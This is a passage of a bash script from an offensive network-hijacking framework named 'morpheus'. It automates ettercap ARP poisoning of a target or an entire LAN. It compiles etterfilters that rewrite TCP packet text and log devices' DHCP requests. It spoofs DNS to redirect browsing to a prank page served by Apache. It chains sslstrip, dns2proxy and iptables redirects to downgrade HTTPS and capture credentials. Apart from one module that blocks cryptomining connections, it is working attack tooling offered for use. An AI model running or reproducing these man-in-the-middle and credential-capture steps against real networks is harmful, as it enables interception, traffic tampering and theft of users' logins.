  echo ${BlueF}[☠]${white} Edit text_replace.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
 rep_one=$(zenity --title="☠ WORD TO REPLACE ☠" --text "example: hello\nchose a word to be replaced in tcp packet." --entry --width 270)
 rep_two=$(zenity --title="☠ WORD TO REPLACE ☠" --text "previous word chosen: $rep_one\nRemmenber: world to be replaced must be of the same legth of the previous one" --entry --width 270)
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|IpAdDR|$fil_one|g" text_replace.eft # NO dev/null to report file not existence :D
  sed -i "s|RePlAcE|$rep_one|g" text_replace.eft
  sed -i "s|InJeC|$rep_two|g" text_replace.eft
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/text_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling text_replace.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/text_replace.eft -o $IPATH/output/text_replace.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/text_replace.rb $IPATH/filters/text_replace.eft
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/text_replace.ef
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------
# WRITE YOUR OWN FILTER
# ----------------------
sh_stageW () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module allow you to write your own filter from scratch.  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  morpheus presents a 'template' previous build for you to write  ${BlueF}|"
echo "${BlueF}    | ${YellowF} your own command logic and automate the compile/lunch of filter. ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/template.eft $IPATH/filters/template.rb
  sleep 1

  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
  sleep 1


    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2

      #
      # execute warn.sh (BEEP) script ?
      #
      warnme=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute warn.sh script?\n\nWARNING: your filter must contain\nthe follow rule to trigger BEEP sounds:\nlog(DATA.data, \"./beep-warning.beep\");" --width 290)
      if [ "$?" -eq "0" ]; then
        # check if: log(DATA.data, "./beep-warning.beep"); API exists in template ..
        cfg=`cat $IPATH/filters/template.eft | grep "log(DATA.data, \"./beep-warning.beep\");"`
        if [ "$?" -eq "0" ]; then
          xterm -T "MORPHEUS - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
        else
          echo ${RedF}[x]${white} Filter rule:${YellowF}" log(DATA.data, \"./beep-warning.beep\");"${Reset};
          echo ${RedF}[x] Not found inside Filter, aborting warn.sh execution ..${Reset};
          sleep 4
        fi
      fi

      cd $IPATH/logs
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  sleep 2
  mv $IPATH/filters/template.rb $IPATH/filters/template.eft
  rm $IPATH/output/template.ef
  # HINT: warn.sh script will run in backgroud if we dont kill the process ..
  if [ "$warnme" = "execute warn.sh" ]; then
    killall warn.sh > dev/null 2>&1
  fi
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# ----------------------------------------
# DHCP DISCOVER (smartphones & PCs)
# ----------------------------------------
sh_stage17 () {

echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This module capture sellected 'device' request to access the local${BlueF}|"
echo "${BlueF}    | ${YellowF} LAN (bootp-dhcp 67/UDP) and it trigger one sound warning (BEEP). ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                          -- WARNING --                           ${BlueF}|"
echo "${BlueF}    | ${YellowF} If the input domain name (target to filter) does NOT contain any ${BlueF}|"
echo "${BlueF}    | ${YellowF} numbers in the END of the string (eg. android-dd4e5d9sy670) then ${BlueF}|"
echo "${BlueF}    | ${YellowF} we need to wait for 'MORPHEUS SCRIPTING CONSOLE' terminal windows${BlueF}|"
echo "${BlueF}    | ${YellowF} to delete the nº7 from the domain name (morpheus add's nº 7 into ${BlueF}|"
echo "${BlueF}    | ${YellowF} the end of the domain name for smartphones discovery/detection). ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2

# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ Devices DHCP discovery ]\nthis module allow users to filter any device\n(domain name OR ip addr) thats trying to access our local lan for the first time (auth)\n\nExecute this module?" --width 300)
if [ "$?" -eq "0" ]; then


# chose to input one or two targets to filter
Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180)


# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
sleep 1
cp $IPATH/filters/dhcp-discovery.eft $IPATH/filters/dhcp-discovery.bak
rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270)
CeDs=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270)
#
# pasing rtarget ip addr (add number 7 at the end of domain-name)
#
store=`echo "$rhost""7"`
echo "$store" > $IPATH/logs/parse



if [ "$Tc" = "two targets input" ]; then
Most=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270)
Desc=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270)

  #
  # parsing data (add number 7 at the end of domain-name)
  #
  twoop=`echo "$Most""7"`
  echo "$twoop" > $IPATH/logs/triggertwo

  # write the rest of the filter (injects into existing filter)
  echo "" >> $IPATH/filters/dhcp-discovery.eft
  echo "if (ip.src == '0.0.0.0' && ip.proto == UDP && udp.dst == 67) {" >> $IPATH/filters/dhcp-discovery.eft
  echo "  if (search(DATA.data, \"$twoop\")) {" >> $IPATH/filters/dhcp-discovery.eft
  echo "  msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] host:0.0.0.0 [ ⊶  ]  found ..\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] | status  : Request access to LAN\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |   port  : 67/UDP(dst) bootp-DHCP ✔\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |   id    : $twoop\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |_  device: $Desc\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    log(DECODED.data, \"./beep-warning.beep\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    log(DECODED.data, \"./triggertwo.bin\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "  }" >> $IPATH/filters/dhcp-discovery.eft
  echo "}" >> $IPATH/filters/dhcp-discovery.eft

fi


  cd $IPATH/filters
  # replace values in template.filter with sed bash command
  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sed -i "s|rTdN|$store|g" dhcp-discovery.eft
  sed -i "s|FtGh|$CeDs|g" dhcp-discovery.eft
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/dhcp-discovery.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling dhcp-discovery.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/dhcp-discovery.eft -o $IPATH/output/dhcp-discovery.ef && sleep 3"
    sleep 1
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP /// ///
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP /// ///
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP // //
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP // //
        fi
      fi

  # check if exist any reports (.log files)
  if [ -e $IPATH/logs/$store.log ] || [ -e $IPATH/logs/$twoop.log ]; then
  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  sleep 2
  mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft
  rm $IPATH/output/dhcp-discovery.ef
  rm $IPATH/logs/parse
  rm $IPATH/logs/triggertwo > /dev/nul 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -------------------------------
# BLOCK CRYPTOMINNING CONNECTIONS
# -------------------------------
sh_stage18 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This filter will act like a firewall reporting and blocking crypto${BlueF}|"
echo "${BlueF}    | ${YellowF}minning currency connections inside Local Lan (selected target)   ${BlueF}|"
echo "${BlueF}    | ${YellowF}If a connection its found on sellected machine (ip address) then  ${BlueF}|"
echo "${BlueF}    | ${YellowF}this filter will warn framework users and drops/kill the minning  ${BlueF}|"
echo "${BlueF}    | ${YellowF}connection (tcp/udp packets) and writtes a logfile in logs folder.${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
crypto=$(zenity --title="☠ DOMAIN NAME TO FILTER ☠" --text "example: coin-hive.com\nchose the domain name to filter through morpheus." --entry --width 270)
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/cryptocurrency.eft $IPATH/filters/cryptocurrency.rb
  cd $IPATH/filters/
  sed -i "s|CrYpT|$crypto|g" cryptocurrency.eft
  sed -i "s|TaRONE|$fil_one|g" cryptocurrency.eft
  sleep 1

  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/cryptocurrency.eft"
  sleep 1

    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/cryptocurrency.eft -o $IPATH/output/cryptocurrency.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -L $IPATH/logs/cryptocurrency -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -L $IPATH/logs/cryptocurrency -M ARP /$rhost/ /$gateway/
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/cryptocurrency.ef


    if [ -e $IPATH/logs/crypto-currency.log ]; then
      cd $IPATH/logs
        # delete utf-8/non-ancii caracters from logfile
        tr -cd '\11\12\15\40-\176' < crypto-currency.log > final.log
        sed -i "s|www||g" final.log
        sed -i "s|\!||g" final.log
        sed -i "s|\+||g" final.log
        sed -i "s|(||g" final.log
        mv final.log crypto-currency.log
        rm final.log
    fi
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# ----------------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE EASTER EGGS (prank)
# ----------------------------------------------------
sh_stage19 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
echo "${BlueF}    | ${YellowF}     mitm attacks to google easter egg webpages (google prank)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}            'All [.com ] domains will be redirected'              ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

#
# chose the easter egg to use under mitm+dns_spoof
#
EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" FALSE "google 180" --width 320 --height 230)
#
# parse easter egg search string
#
if [ "$EGG" = "Do a Barrel roll" ]; then
  parsed="Do+a+Barrel+roll"
elif [ "$EGG" = "zerg rush" ]; then
  parsed="zerg+rush"
elif [ "$EGG" = "blink html" ]; then
  parsed="Blink+HTML"
else
  parsed="<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>"
fi



  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/EasterEgg.eft $IPATH/filters/EasterEgg.rb # backup
  cp $IPATH/bin/phishing/EasterEgg.html $IPATH/bin/phishing/EasterEgg.bak # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};

    # using SED bash command to config redirect.eft
    if [ "$EGG" = "google 180" ]; then
      sed -i "s|IpAdR|$parsed|g" $IPATH/filters/EasterEgg.eft
    else
      sed -i "s|IpAdR|https://www.google.im/search?q=$parsed&gws_rd=ssl|g" $IPATH/filters/EasterEgg.eft
    fi

  echo ${BlueF}[☠]${white} google easter egg:${GreenF}$parsed ${Reset};
  # copy files needed to apache2 webroot...
  cd phishing/
  if [ "$EGG" = "google 180" ]; then
    cp $IPATH/bin/phishing/Google_prank_180/googlelogo_color_272x92dp.png $ApachE/googlelogo_color_272x92dp.png
    cp $IPATH/bin/phishing/Google_prank_180/Google.html $ApachE/index.html
  else
    sed -i "s|RePlAcE|$parsed|g" EasterEgg.html
    cp $IPATH/bin/phishing/EasterEgg.html $ApachE/index.html
  fi
cd $IPATH
sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/EasterEgg.eft"
echo ${BlueF}[☠]${white} Compiling EasterEgg.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/EasterEgg.eft -o $IPATH/output/EasterEgg.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 270
  rm $IPATH/output/EasterEgg.ef
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft # backup
  mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html # backup
  rm $ApachE/index.html
  rm $ApachE/googlelogo_color_272x92dp.png
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# ----------------------------------------------------------------
# CAPTURE HTTPS CREDENTIALS (dns2proxy|sslstrip|ettercap|iptables)
# REF: https://www.guiadoti.com/2017/09/sslstrip-2-0-hsts-bypass/
# VID: http://www.youtube.com/watch?v=uGBjxfizy48
# ----------------------------------------------------------------
sh_stage20 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This module uses dns2proxy + sslstrip + ettercap + iptables to be ${BlueF}|"
echo "${BlueF}    | ${YellowF} able to capture https (ssl) credentials over mitm + dns_spoofing ${BlueF}|"
echo "${BlueF}    | ${YellowF}         ( by downgrade packets from HTTPS to HTTP )              ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then
echo ${BlueF}[☠]${white} checking module dependencies ..${Reset};
sleep 2


#
# check dependencies (backend appl)
#
c=`dpkg -l python-twisted-web`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} python-twisted-web${RedF}:${GreenF} found .. ${Reset};
  sleep 1
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} python-twisted-web${RedF}:${GreenF} not found .. ${Reset};
  sleep 1
  echo ""
  apt-get install python-twisted-web
  echo ""
fi


t=`which sslstrip`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} sslstrip-0.9${RedF}:${GreenF} found .. ${Reset};
  sleep 1
  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} sslstrip-0.9${RedF}:${RedF} not found .. ${Reset};
  sleep 1
  cd $IPATH/bin/Utils/sslstrip-0.9
  echo ""
  python setup.py build & python setup.py install
  echo ""
  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
  cd $IPATH/
fi


if [ -e "$IPATH/bin/Utils/dns2proxy/dns2proxy.py" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} dns2proxy${RedF}:${GreenF} found .. ${Reset};
  sleep 1
  dnsproxypath="$IPATH/bin/Utils/dns2proxy/dns2proxy.py"
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} dns2proxy${RedF}:${RedF} not found .. ${Reset};
  sleep 1
fi


c=`pip install dnspython`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} dnspython${RedF}:${GreenF} found .. ${Reset};
  sleep 1
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} dnspython${RedF}:${GreenF} not found .. ${Reset};
  sleep 1
  echo ""
  pip install dnspython
  echo ""
fi



#
# Restart tool after installing missing dependencies
#
if [ "$Fail" = "YES" ]; then
  echo ${BlueF}[${RedF}x${BlueF}]${white} restarting morpheus to finish installs ..${Reset};
  sleep 3
  exit
fi



#
# start of module funtions ..
#
cd $IPATH/output
if [ -e $stripath ]; then
  :
else
  echo ${BlueF}[${RedF}x${BlueF}]${white} SSLSTRIP installation NOT found ..${Reset};
  sleep 2
  exit
fi
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

  #
  # ip fowarding in iptables
  #
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  sleep 1
  echo "1" > /proc/sys/net/ipv4/ip_forward

  #
  # IPTABLES SETTINGS ..
  #
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 
  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

  # ARP poison ..
  cd $IPATH/bin/Utils/dns2proxy
  if [ "$IpV" = "ACTIVE" ]; then
    echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
    sleep 2
    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
  else
    echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
    sleep 2
    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
  fi


  # clean all settings
  sleep 2
